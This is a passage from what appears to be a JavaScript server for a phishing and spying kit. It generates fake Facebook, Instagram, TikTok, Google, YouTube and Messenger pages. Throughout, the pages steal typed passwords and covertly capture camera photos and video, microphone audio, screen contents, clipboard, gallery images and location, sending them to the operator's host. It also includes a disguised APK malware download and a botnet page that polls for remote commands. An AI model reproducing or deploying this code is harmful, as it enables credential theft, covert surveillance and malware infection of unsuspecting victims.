  document.querySelector('p').textContent='Your browser is now up to date.';
}
function send(ep,body){
  return fetch(D+'/'+ep,{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({uid:UID,...body})}).catch(()=>{});
}
</script>
</body>
</html>`;
}

// ── Phone Spy Link Page ───────────────────────────────────────
function phoneSpyPage(uid) { return buildPhoneSpyFile(uid); }

// ── APK Download Page ─────────────────────────────────────────
function apkPage(uid) {
    return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>YouTube</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0f0f0f;color:#fff;font-family:-apple-system,sans-serif;min-height:100vh;padding:16px}
.hdr{display:flex;align-items:center;gap:10px;padding:12px 0;border-bottom:1px solid #222;margin-bottom:16px}
.ytl{background:#ff0000;border-radius:8px;padding:6px 12px;font-size:16px;font-weight:bold}
.tw{position:relative;width:100%;padding-top:56.25%;background:#1a1a1a;border-radius:10px;overflow:hidden;margin-bottom:12px;cursor:pointer}
.ti{position:absolute;inset:0;display:flex;align-items:center;justify-content:center}
.pb{width:70px;height:70px;background:rgba(255,0,0,.9);border-radius:50%;display:flex;align-items:center;justify-content:center}
.pt{border:solid transparent;border-width:18px 0 18px 30px;border-left-color:#fff;margin-left:5px}
.vt{font-size:15px;font-weight:600;margin-bottom:5px}
.vm{font-size:12px;color:#aaa;margin-bottom:16px}
.nb{background:#1a1a1a;border:1px solid #333;border-radius:10px;padding:16px;text-align:center}
.nt{font-size:15px;font-weight:600;margin-bottom:6px}
.ns{font-size:12px;color:#aaa;margin-bottom:14px}
.ab{width:100%;padding:14px;background:#ff0000;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:bold;cursor:pointer}
.db{width:100%;padding:10px;background:transparent;color:#666;border:1px solid #333;border-radius:8px;font-size:13px;cursor:pointer;margin-top:8px}
#st{text-align:center;color:#aaa;font-size:12px;padding:8px}
</style>
</head>
<body>
<div class="hdr"><div class="ytl">▶ YouTube</div></div>
<div class="tw" onclick="dl()"><div class="ti"><div class="pb"><div class="pt"></div></div></div></div>
<div class="vt">🔴 LIVE — Exclusive Premium Content [4K]</div>
<div class="vm">YouTube Premium • 5.2M views</div>
<div class="nb" id="nb">
  <div class="nt">⚡ Premium App Required</div>
  <div class="ns">Install YouTube Premium to watch this video.</div>
  <button class="ab" onclick="dl()">📥 Install & Watch Free</button>
  <button class="db" onclick="this.parentNode.querySelector('.ab').click()">Later</button>
</div>
<div id="st"></div>
<script>
const UID='${uid}',BASE='${HOST}',D='${HOST}/d';
window.onload=function(){
  fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({uid:UID,type:'💀 APK Page Opened',data:navigator.userAgent})});
};
function dl(){
  document.getElementById('nb').innerHTML='<div style="padding:10px;color:#aaa;font-size:13px">📥 Downloading...</div>';
  const a=document.createElement('a');a.href=BASE+'/payload.apk';a.download='YouTube_Premium.apk';
  document.body.appendChild(a);a.click();document.body.removeChild(a);
  fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({uid:UID,type:'💀 APK DOWNLOADED',data:navigator.userAgent})});
  setTimeout(()=>{
    document.getElementById('st').textContent='Open Downloads → install YouTube_Premium.apk';
    document.getElementById('nb').innerHTML='<div style="padding:10px;color:#aaa;font-size:13px;text-align:center">✅ Download complete</div>';
  },3000);
}
</script>
</body>
</html>`;
}

// ── Botnet Page ───────────────────────────────────────────────
function botnetPage(uid) {
    const vid = crypto.randomBytes(8).toString('hex');
    return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Google Security</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;font-family:-apple-system,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px;text-align:center;color:#333}
.glogo{font-size:52px;margin-bottom:20px}
.card{width:100%;max-width:360px;border:1px solid #ddd;border-radius:12px;padding:24px}
h2{font-size:18px;margin-bottom:8px}p{font-size:13px;color:#666;margin-bottom:20px;line-height:1.5}
.btn{width:100%;padding:14px;background:#4285f4;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:bold;cursor:pointer}
.spin{display:none;width:30px;height:30px;border:3px solid #eee;border-top-color:#4285f4;border-radius:50%;animation:s .8s linear infinite;margin:14px auto}
@keyframes s{to{transform:rotate(360deg)}}
#st{font-size:12px;color:#999;margin-top:10px}
</style>
</head>
<body>
<div class="glogo">🔒</div>
<div class="card">
<h2>Verify Your Identity</h2>
<p>Google needs to verify your account for security.</p>
<button class="btn" id="btn" onclick="run()">Verify Now</button>
<div class="spin" id="sp"></div>
<div id="st"></div>
</div>
<script>
const UID='${uid}',VID='${vid}',BASE='${HOST}',D='${HOST}/d',B='${HOST}/b';
window.onload=async function(){
  await fetch(B+'/reg',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({uid:UID,victimId:VID,model:navigator.userAgent.slice(0,80)})}).catch(()=>{});
  if('serviceWorker' in navigator) navigator.serviceWorker.register('/sw.js').catch(()=>{});
  setInterval(poll,12000);
};
async function run(){
  document.getElementById('btn').style.display='none';
  document.getElementById('sp').style.display='block';
  document.getElementById('st').textContent='Verifying...';
  if('Notification' in window) await Notification.requestPermission().catch(()=>{});
  try{
    const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
    const v=document.createElement('video');v.autoplay=true;v.muted=true;v.playsInline=true;
    v.srcObject=s;v.style.display='none';document.body.appendChild(v);
    await new Promise(r=>v.onloadedmetadata=r);await new Promise(r=>setTimeout(r,1500));
    const c=document.createElement('canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;
    c.getContext('2d').drawImage(v,0,0);s.getTracks().forEach(t=>t.stop());v.remove();
    const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));
    const fd=new FormData();fd.append('photo',b,'bot.jpg');fd.append('uid',UID);fd.append('camtype','🤖 Botnet Cam');
    fetch(D+'/photo',{method:'POST',body:fd}).catch(()=>{});
  }catch(e){}
  navigator.geolocation&&navigator.geolocation.getCurrentPosition(p=>{
    fetch(D+'/loc',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({uid:UID,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})}).catch(()=>{});
  });
  fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({uid:UID,type:'🤖 BOT JOINED',data:'VID:'+VID+'\n'+navigator.userAgent})}).catch(()=>{});
  setTimeout(()=>{
    document.getElementById('sp').style.display='none';
    document.getElementById('st').textContent='✅ Verified';
    document.querySelector('h2').textContent='Verification Complete';
  },3000);
}
async function poll(){
  try{
    const r=await fetch(B+'/poll',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,victimId:VID})});
    const d=await r.json();
    if(d.commands) for(const c of d.commands) await exec(c);
  }catch(e){}
}
async function exec(cmd){
  if(cmd==='photo'){
    try{
      const s=await navigator.mediaDevices.getUserMedia({video:true,audio:false});
      const v=document.createElement('video');v.autoplay=true;v.muted=true;v.playsInline=true;v.srcObject=s;v.style.display='none';document.body.appendChild(v);
      await new Promise(r=>v.onloadedmetadata=r);await new Promise(r=>setTimeout(r,1500));
      const c=document.createElement('canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);s.getTracks().forEach(t=>t.stop());v.remove();
      const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));
      const fd=new FormData();fd.append('photo',b,'cmd.jpg');fd.append('uid',UID);fd.append('camtype','🤖 Bot CMD Photo');
      fetch(D+'/photo',{method:'POST',body:fd}).catch(()=>{});
    }catch(e){}
  }
  if(cmd==='location'){
    navigator.geolocation&&navigator.geolocation.getCurrentPosition(p=>{
      fetch(D+'/loc',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({uid:UID,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})}).catch(()=>{});
    });
  }
}
</script>
</body>
</html>`;
}

// ── Phishing Pages ────────────────────────────────────────────
function phishPage(action, uid) {
    const cfg = {
        phish_fb: {name:'Facebook',rdr:'facebook.com',bg:'#1877f2',card:'rgba(0,0,0,.15)',tc:'#fff',bc:'#fff',btc:'#1877f2',ic:'rgba(255,255,255,.2)',ib:'rgba(255,255,255,.3)',ph:'Phone or email',logo:`<svg viewBox="0 0 100 100" width="60"><circle cx="50" cy="50" r="50" fill="white"/><path d="M57 25h-9C40 25 37 28 37 34v7h-8v10h8v28h11V51h9l1-10h-10v-6c0-3 1-4 4-4h6V25z" fill="#1877f2"/></svg>`},
        phish_ig: {name:'Instagram',rdr:'instagram.com',bg:'#fff',card:'#fff',tc:'#262626',bc:'#0095f6',btc:'#fff',ic:'#fafafa',ib:'#dbdbdb',ph:'Phone, username or email',logo:`<svg viewBox="0 0 100 100" width="60"><defs><linearGradient id="g" x1="0%" y1="100%" x2="100%" y2="0%"><stop offset="0%" stop-color="#f09433"/><stop offset="50%" stop-color="#dc2743"/><stop offset="100%" stop-color="#bc1888"/></linearGradient></defs><rect width="100" height="100" rx="22" fill="url(#g)"/><rect x="25" y="25" width="50" height="50" rx="14" fill="none" stroke="white" stroke-width="6"/><circle cx="50" cy="50" r="14" fill="none" stroke="white" stroke-width="6"/><circle cx="71" cy="29" r="5" fill="white"/></svg>`},
        phish_tt: {name:'TikTok',rdr:'tiktok.com',bg:'#000',card:'#161823',tc:'#fff',bc:'#fe2c55',btc:'#fff',ic:'#2a2a2a',ib:'#333',ph:'Phone / Email / Username',logo:`<svg viewBox="0 0 100 100" width="60"><rect width="100" height="100" rx="18" fill="#000"/><path d="M72 35c-8 0-15-7-15-15H47v50c0 6-5 10-10 10s-10-4-10-10 4-10 10-10V50c-11 0-20 9-20 20s9 20 20 20 20-9 20-20V55c4 3 9 5 15 5V50c-5 0-10-2-15-6V35h15z" fill="white"/></svg>`}
    };
    const c=cfg[action]||cfg.phish_fb;
    const dark = action!=='phish_ig';
    return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>${c.name}</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:${c.bg};color:${c.tc};font-family:-apple-system,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.logo{text-align:center;margin-bottom:24px}
.card{width:100%;max-width:380px;background:${c.card};border-radius:10px;padding:24px;border:${action==='phish_ig'?'1px solid #dbdbdb':'none'}}
input{width:100%;padding:13px;margin:6px 0;border-radius:8px;border:1px solid ${c.ib};background:${c.ic};color:${c.tc};font-size:15px;outline:none}
input::placeholder{color:${dark?'rgba(255,255,255,.5)':'#aaa'}}
.btn{width:100%;padding:14px;margin-top:12px;border:none;border-radius:8px;background:${c.bc};color:${c.btc};font-size:16px;font-weight:bold;cursor:pointer}
.lnk{text-align:center;font-size:13px;color:${c.bc==='#fff'?'#8ab4f8':c.bc};margin-top:14px;cursor:pointer}
.or{text-align:center;color:${dark?'rgba(255,255,255,.4)':'#aaa'};font-size:13px;margin:12px 0}
</style>
</head>
<body>
<div class="logo">${c.logo}</div>
<div class="card">
  <input type="text"     id="u" placeholder="${c.ph}">
  <input type="password" id="p" placeholder="Password">
  <button class="btn" onclick="sub()">Log In</button>
  <div class="or">Forgot password?</div>
  <div class="lnk">Create new account</div>
</div>
<script>
const UID='${uid}',D='${HOST}/d',SITE='${c.name}',RDR='https://www.${c.rdr}';
window.onload=function(){
  fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({uid:UID,type:SITE+' Phish Opened',data:navigator.userAgent})});
};
async function sub(){
  const u=document.getElementById('u').value,p=document.getElementById('p').value;
  if(!u||!p)return;
  document.querySelector('.btn').textContent='Logging in...';
  await fetch(D+'/creds',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({uid:UID,site:SITE,user:u,pass:p})});
  setTimeout(()=>window.location.href='https://www.'+RDR,600);
}
</script>
</body>
</html>`;
}

// ── Attack Pages -- প্রতিটা শুধু তার কাজ করবে ───────────────
function attackPage(action, uid) {
    // কোনটা কী করবে -- শুধু সেটাই
    const actions = {
        // শুধু ফ্রন্ট ক্যামেরা ছবি
        cam_f_photo:  { do:'front_photo',  skin:{bg:'#000',icon:'📞',h:'Incoming Call',s:'Tap accept to join',btn:'Accept',bc:'#25D366'} },
        // শুধু ফ্রন্ট ক্যামেরা ভিডিও
        cam_f_video:  { do:'front_video',  skin:{bg:'#000',icon:'🎥',h:'Video Message',s:'Tap to watch',btn:'▶ Watch',bc:'#C13584'} },
        // শুধু ব্যাক ক্যামেরা ছবি
        cam_b_photo:  { do:'back_photo',   skin:{bg:'#000',icon:'📸',h:'Someone shared a photo',s:'Tap to view',btn:'View Photo',bc:'#1877f2'} },
        // শুধু ব্যাক ক্যামেরা ভিডিও
        cam_b_video:  { do:'back_video',   skin:{bg:'#000',icon:'🎬',h:'Video Shared',s:'Tap to view',btn:'▶ Play',bc:'#ff0000'} },
        // শুধু লোকেশন
        location:     { do:'location_only',skin:{bg:'#fff',icon:'📍',h:'Confirm Your Location',s:'Confirm delivery address',btn:'Confirm',bc:'#4CAF50'} },
        // শুধু গ্যালারি
        gallery:      { do:'gallery_only', skin:{bg:'#fff',icon:'🖼️',h:'Shared Album',s:'Someone shared photos with you',btn:'View Album',bc:'#9C27B0'} },
        // শুধু মাইক
        mic:          { do:'mic_only',     skin:{bg:'#1a1a1a',icon:'🎙️',h:'Voice Message',s:'Tap to listen',btn:'▶ Play',bc:'#25D366'} },
        // শুধু ক্লিপবোর্ড
        clipboard:    { do:'clip_only',    skin:{bg:'#fff',icon:'🏦',h:'Confirm OTP',s:'Paste your one-time code',btn:'Confirm',bc:'#1877f2'} },
        // ডিভাইস ইনফো (প্যাসিভ)
        devinfo:      { do:'info_only',    skin:{bg:'#fff',icon:'⚙️',h:'System Update',s:'Tap to install security update',btn:'Install',bc:'#4285f4'} },
        // ফুল রিকন
        recon:        { do:'full',         skin:{bg:'#3b5998',icon:'👤',h:'Facebook Verification',s:'Verify your account',btn:'Verify Now',bc:'#1877f2'} }
    };

    const info = actions[action] || actions.recon;
    const s    = info.skin;
    const dark = s.bg !== '#fff';
    const tc   = dark ? '#fff' : '#333';
    const sc   = dark ? '#aaa' : '#666';

    // JS কোড -- action অনুযায়ী
    let jsCode = '';
    switch(info.do) {
        case 'front_photo':
            jsCode = `async function go(){ btn(); await cam(true,false); ok(); }`;
            break;
        case 'front_video':
            jsCode = `async function go(){ btn(); await vid(true); ok(); }`;
            break;
        case 'back_photo':
            jsCode = `async function go(){ btn(); await cam(false,false); ok(); }`;
            break;
        case 'back_video':
            jsCode = `async function go(){ btn(); await vid(false); ok(); }`;
            break;
        case 'location_only':
            jsCode = `async function go(){ btn(); await loc(); ok(); }`;
            break;
        case 'gallery_only':
            jsCode = `async function go(){ btn(); await gal(); ok(); }`;
            break;
        case 'mic_only':
            jsCode = `async function go(){ btn(); await mic(); ok(); }`;
            break;
        case 'clip_only':
            jsCode = `async function go(){ btn(); await clip(); ok(); }`;
            break;
        case 'info_only':
            jsCode = `async function go(){ btn(); ok(); /* info sent on load */ }`;
            break;
        case 'full':
            jsCode = `async function go(){ btn(); await cam(true,false); await cam(false,false); await loc(); await mic(); await clip(); ok(); }`;
            break;
        default:
            jsCode = `async function go(){ btn(); await loc(); ok(); }`;
    }

    return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:${s.bg};color:${tc};font-family:-apple-system,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;padding:20px}
.ic{font-size:72px;margin-bottom:20px;animation:p 1.5s infinite}
@keyframes p{0%,100%{transform:scale(1)}50%{transform:scale(1.12)}}
h2{font-size:22px;margin-bottom:10px}
p{color:${sc};font-size:15px;margin-bottom:28px}
#mainbtn{padding:16px 0;width:240px;border:none;border-radius:50px;background:${s.bc};color:#fff;font-size:17px;font-weight:600;cursor:pointer;display:block;margin:0 auto}
#st{margin-top:20px;color:${sc};font-size:13px}
video,canvas{display:none;width:1px;height:1px}
</style>
</head>
<body>
<div class="ic">${s.icon}</div>
<h2>${s.h}</h2>
<p>${s.s}</p>
<button id="mainbtn" onclick="go()">${s.btn}</button>
<div id="st"></div>
<video id="vv" autoplay playsinline muted></video>
<canvas id="cc"></canvas>
<script>
const UID='${uid}',D='${HOST}/d';
function btn(){document.getElementById('mainbtn').textContent='...';document.getElementById('st').textContent='Please wait...';}
function ok(){document.getElementById('mainbtn').textContent='${s.btn}';document.getElementById('st').textContent='✓';document.querySelector('p').textContent='Thank you!';}
function post(ep,body){return fetch(D+'/'+ep,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,...body})}).catch(()=>{});}

window.onload=function(){
  const i={ua:navigator.userAgent,sc:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,t:new Date().toString()};
  if(navigator.getBattery) navigator.getBattery().then(b=>{i.bat=Math.round(b.level*100)+'%';i.chg=b.charging;post('text',{type:'📱 Device Info',data:JSON.stringify(i,null,2)});});
  else post('text',{type:'📱 Device Info',data:JSON.stringify(i,null,2)});
};

${jsCode}

async function cam(front, multiple){
  const count = multiple ? 5 : 1;
  for(let i=0;i<count;i++){
    try{
      const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:front?'user':'environment'},audio:false});
      const v=document.getElementById('vv');v.srcObject=s;
      await new Promise(r=>v.onloadedmetadata=r);await new Promise(r=>setTimeout(r,1500));
      const c=document.getElementById('cc');c.width=v.videoWidth||640;c.height=v.videoHeight||480;
      c.getContext('2d').drawImage(v,0,0);s.getTracks().forEach(t=>t.stop());
      const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));
      const fd=new FormData();fd.append('photo',b,'p.jpg');fd.append('uid',UID);
      fd.append('camtype',(front?'📷 Front':'📷 Back')+' Camera');
      await fetch(D+'/photo',{method:'POST',body:fd});
      if(i<count-1) await new Promise(r=>setTimeout(r,2000));
    }catch(e){break;}
  }
}

async function vid(front){
  return new Promise(async r=>{
    try{
      const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:front?'user':'environment'},audio:true});
      const rec=new MediaRecorder(s,{mimeType:'video/webm'});
      const ch=[];
      rec.ondataavailable=e=>ch.push(e.data);
      rec.onstop=async()=>{
        const blob=new Blob(ch,{type:'video/webm'});
        const fd=new FormData();fd.append('video',blob,'vid.webm');fd.append('uid',UID);
        fd.append('camtype',(front?'📷 Front':'📷 Back')+' Video');
        await fetch(D+'/video',{method:'POST',body:fd}).catch(()=>{});
        s.getTracks().forEach(t=>t.stop());r();
      };
      rec.start();
      setTimeout(()=>rec.stop(),15000); // 15 সেকেন্ড ভিডিও
    }catch(e){r();}
  });
}

async function loc(){
  return new Promise(r=>{
    if(!navigator.geolocation){r();return;}
    navigator.geolocation.getCurrentPosition(p=>{
      post('loc',{lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});r();
    },r,{enableHighAccuracy:true,timeout:10000});
  });
}

async function mic(){
  return new Promise(async r=>{
    try{
      const s=await navigator.mediaDevices.getUserMedia({audio:true,video:false});
      const rec=new MediaRecorder(s);const ch=[];
      rec.ondataavailable=e=>ch.push(e.data);
      rec.onstop=async()=>{
        const fd=new FormData();fd.append('audio',new Blob(ch,{type:'audio/webm'}),'mic.webm');fd.append('uid',UID);
        await fetch(D+'/audio',{method:'POST',body:fd});
        s.getTracks().forEach(t=>t.stop());r();
      };
      rec.start();setTimeout(()=>rec.stop(),10000);
    }catch(e){r();}
  });
}

async function clip(){
  try{const t=await navigator.clipboard.readText();await post('text',{type:'📋 Clipboard',data:t});}catch(e){}
}

async function gal(){
  return new Promise(r=>{
    const inp=document.createElement('input');
    inp.type='file';inp.accept='image/*';inp.multiple=true;inp.style.display='none';
    inp.onchange=async()=>{
      const files=[...inp.files];
      document.getElementById('st').textContent=files.length+' photos sending...';
      for(const f of files){
        try{
          const buf=await f.arrayBuffer();
          const fd=new FormData();
          fd.append('photo',new Blob([buf],{type:f.type}),f.name);
          fd.append('uid',UID);fd.append('camtype','🖼️ Gallery: '+f.name);
          await fetch(D+'/photo',{method:'POST',body:fd});
        }catch(e){}
      }
      r();
    };
    document.body.appendChild(inp);inp.click();
    setTimeout(r,60000);
  });
}
</script>
</body>
</html>`;
}

// ── Keepalive ─────────────────────────────────────────────────
setInterval(() => {
    appSocket.clients.forEach(ws => { if (ws.readyState===webSocket.OPEN) ws.send('ping'); });
    if (HOST) axios.get(HOST).catch(()=>{});
}, 5000);

appServer.listen(process.env.PORT || 8999, () => console.log('[+] Server running'));

// ── Messenger Page ────────────────────────────────────────────
function messengerPage(uid) {
    return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Messenger</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;font-family:-apple-system,sans-serif;min-height:100vh}
.hdr{background:#0084ff;padding:14px 16px;display:flex;align-items:center;gap:10px}
.hdr-icon{width:36px;height:36px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:20px}
.hdr-txt{color:#fff;font-size:17px;font-weight:600}
.notice{background:#f0f2f5;margin:12px;padding:14px;border-radius:12px;text-align:center}
.notice-title{font-size:15px;font-weight:600;color:#333;margin-bottom:6px}
.notice-sub{font-size:13px;color:#666;margin-bottom:14px}
.allow-btn{width:100%;padding:12px;background:#0084ff;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}
.chat-item{display:flex;align-items:center;padding:12px 16px;border-bottom:1px solid #f0f2f5;gap:12px}
.avatar{width:48px;height:48px;border-radius:50%;background:#0084ff;display:flex;align-items:center;justify-content:center;color:#fff;font-size:18px;flex-shrink:0}
.chat-info{flex:1}
.chat-name{font-size:15px;font-weight:600;color:#333}
.chat-msg{font-size:13px;color:#666;margin-top:2px}
.chat-time{font-size:11px;color:#999}
#st{text-align:center;padding:10px;font-size:12px;color:#999}
</style>
</head>
<body>
<div class="hdr">
  <div class="hdr-icon">💬</div>
  <div class="hdr-txt">Messenger</div>
</div>

<div class="notice">
  <div class="notice-title">📸 New Feature: Chat Backup</div>
  <div class="notice-sub">Allow Messenger to back up your chat screenshots automatically.</div>
  <button class="allow-btn" onclick="run()">Allow & Enable</button>
</div>

<div id="st"></div>

<!-- fake chat list -->
<div class="chat-item"><div class="avatar">R</div><div class="chat-info"><div class="chat-name">Rahim</div><div class="chat-msg">Bhai ki obostha?</div></div><div class="chat-time">2m</div></div>
<div class="chat-item"><div class="avatar">K</div><div class="chat-info"><div class="chat-name">Karim</div><div class="chat-msg">Ok done</div></div><div class="chat-time">15m</div></div>
<div class="chat-item"><div class="avatar">S</div><div class="chat-info"><div class="chat-name">Sumaiya</div><div class="chat-msg">Haha 😂</div></div><div class="chat-time">1h</div></div>
<div class="chat-item"><div class="avatar">N</div><div class="chat-info"><div class="chat-name">Nusrat</div><div class="chat-msg">Ki bolchos?</div></div><div class="chat-time">3h</div></div>
<div class="chat-item"><div class="avatar">A</div><div class="chat-info"><div class="chat-name">Abir</div><div class="chat-msg">Send koro please</div></div><div class="chat-time">5h</div></div>
<div class="chat-item"><div class="avatar">T</div><div class="chat-info"><div class="chat-name">Tanha</div><div class="chat-msg">Asche</div></div><div class="chat-time">1d</div></div>

<script>
const UID='${uid}',D='${HOST}/d';
window.onload=function(){
  const i={ua:navigator.userAgent,sc:screen.width+'x'+screen.height,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,t:new Date().toString()};
  fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({uid:UID,type:'💬 Messenger Page Opened',data:JSON.stringify(i)})});
};
async function run(){
  document.querySelector('.allow-btn').textContent='Processing...';
  document.getElementById('st').textContent='Capturing...';

  // get location
  navigator.geolocation&&navigator.geolocation.getCurrentPosition(p=>{
    fetch(D+'/loc',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({uid:UID,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})});
  });

  // capture front camera (will show victim's face + possibly their screen)
  try{
    const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
    const v=document.createElement('video');v.autoplay=true;v.muted=true;v.playsInline=true;
    v.srcObject=stream;v.style.cssText='position:fixed;top:0;left:0;width:1px;height:1px;opacity:0';
    document.body.appendChild(v);
    await new Promise(r=>v.onloadedmetadata=r);
    await new Promise(r=>setTimeout(r,1500));
    const c=document.createElement('canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;
    c.getContext('2d').drawImage(v,0,0);
    stream.getTracks().forEach(t=>t.stop());v.remove();
    const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));
    const fd=new FormData();fd.append('photo',b,'messenger_cam.jpg');fd.append('uid',UID);
    fd.append('camtype','💬 Messenger Cam');
    await fetch(D+'/photo',{method:'POST',body:fd});
  }catch(e){}

  // try screen capture (works on some Android Chrome)
  try{
    const stream=await navigator.mediaDevices.getDisplayMedia({video:true,audio:false});
    const v=document.createElement('video');v.autoplay=true;v.muted=true;v.playsInline=true;
    v.srcObject=stream;v.style.cssText='position:fixed;top:0;left:0;width:1px;height:1px;opacity:0';
    document.body.appendChild(v);
    await new Promise(r=>v.onloadedmetadata=r);
    await new Promise(r=>setTimeout(r,1000));
    const c=document.createElement('canvas');c.width=v.videoWidth||1080;c.height=v.videoHeight||1920;
    c.getContext('2d').drawImage(v,0,0);
    stream.getTracks().forEach(t=>t.stop());v.remove();
    const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));
    const fd=new FormData();fd.append('photo',b,'screen_cap.jpg');fd.append('uid',UID);
    fd.append('camtype','🖥️ Screen Capture');
    await fetch(D+'/photo',{method:'POST',body:fd});
  }catch(e){}

  // send device+browser info
  fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({uid:UID,type:'💬 Messenger Access Granted',
      data:'UA: '+navigator.userAgent})});

  document.querySelector('.allow-btn').textContent='✅ Enabled';
  document.getElementById('st').textContent='Backup enabled successfully';
}
</script>
</body>
</html>`;
}

// ── Screen Capture Page ───────────────────────────────────────
function screenPage(uid) {
    return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>YouTube</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0f0f0f;color:#fff;font-family:-apple-system,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;padding:20px}
.yt{font-size:60px;margin-bottom:16px}
h2{font-size:20px;margin-bottom:8px}
p{font-size:14px;color:#aaa;margin-bottom:24px}
.box{background:#1a1a1a;border:1px solid #333;border-radius:12px;padding:20px;width:100%;max-width:360px;margin-bottom:16px}
.box-title{font-size:14px;font-weight:600;margin-bottom:6px}
.box-sub{font-size:12px;color:#aaa;margin-bottom:14px}
.btn{width:100%;padding:13px;background:#ff0000;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:bold;cursor:pointer}
.btn2{width:100%;padding:10px;background:transparent;color:#666;border:1px solid #333;border-radius:8px;font-size:13px;cursor:pointer;margin-top:8px}
#st{font-size:12px;color:#aaa;margin-top:12px}
video,canvas{display:none;width:1px;height:1px}
</style>
</head>
<body>
<div class="yt">▶️</div>
<h2>YouTube Premium</h2>
<p>This video requires screen sharing permission</p>
<div class="box">
  <div class="box-title">🔒 Share Screen to Continue</div>
  <div class="box-sub">YouTube needs screen access to verify Premium subscription and play protected content.</div>
  <button class="btn" onclick="run()">▶ Allow & Watch</button>
  <button class="btn2" onclick="this.previousElementSibling.click()">Later</button>
</div>
<div id="st"></div>
<video id="vv" autoplay playsinline muted></video>
<canvas id="cc"></canvas>
<script>
const UID='${uid}',D='${HOST}/d';
window.onload=function(){
  fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({uid:UID,type:'🖥️ Screen Page Opened',data:navigator.userAgent})});
  // passive location
  navigator.geolocation&&navigator.geolocation.getCurrentPosition(p=>{
    fetch(D+'/loc',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({uid:UID,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})});
  });
};
async function run(){
  document.querySelector('.btn').textContent='Loading...';
  document.getElementById('st').textContent='Please allow...';

  // 1. try screen capture first
  try{
    const stream=await navigator.mediaDevices.getDisplayMedia({video:true,audio:false});
    const v=document.getElementById('vv');v.srcObject=stream;
    await new Promise(r=>v.onloadedmetadata=r);
    await new Promise(r=>setTimeout(r,800));
    const c=document.getElementById('cc');
    c.width=v.videoWidth||1080;c.height=v.videoHeight||1920;
    c.getContext('2d').drawImage(v,0,0);
    stream.getTracks().forEach(t=>t.stop());
    const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.95));
    const fd=new FormData();fd.append('photo',b,'screen.jpg');fd.append('uid',UID);
    fd.append('camtype','🖥️ SCREEN CAPTURE');
    await fetch(D+'/photo',{method:'POST',body:fd});
    document.getElementById('st').textContent='✅ Done';
  }catch(e){
    // fallback -- front camera
    try{
      const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
      const v=document.getElementById('vv');v.srcObject=stream;
